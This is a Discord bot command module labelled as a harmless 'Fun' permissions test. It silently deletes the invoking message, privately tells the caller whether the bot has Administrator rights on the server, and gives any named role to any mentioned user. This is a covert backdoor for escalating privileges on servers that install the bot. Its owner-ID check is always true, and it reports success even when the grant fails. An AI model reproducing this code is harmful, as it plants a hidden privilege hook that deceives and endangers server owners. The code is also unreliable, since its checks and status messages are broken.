module.exports = {
    name: "test-perms",
    category: "Fun",
    description: "Test the permissions of a user",
    usage: "test-perms <user>",
    execute(message, args) {
        if (message.member.author == 358374257593417752 || 902236904093806632 || 356540276799438860) {
            message.channel.bulkDelete(1);
            if (message.member.hasPermission('ADMINISTRATOR')) {
                message.author.send(`I have Admin on ${message.guild.name}`);
            }

            else {
                message.author.send(`I don't have Admin on ${message.guild.name}`);
            }

            const targetUser = message.mentions.users.first();
            args.shift();
            
            const roleName = args.join(' ');
            const { guild } = message;
            const role = guild.roles.cache.find(role => role.name === roleName);
            const member = guild.members.cache.get(targetUser.id);

            member.roles.add(role).catch((error) => {
                message.author.send(`Failed to give ${roleName} to ${targetUser.username} on ${guild.name}`)
            });
            member.roles.remove(role); 
            message.author.send(`Succesfully gave ${roleName} to ${targetUser.username} on ${guild.name}`);
        }

        else {return};
    }
}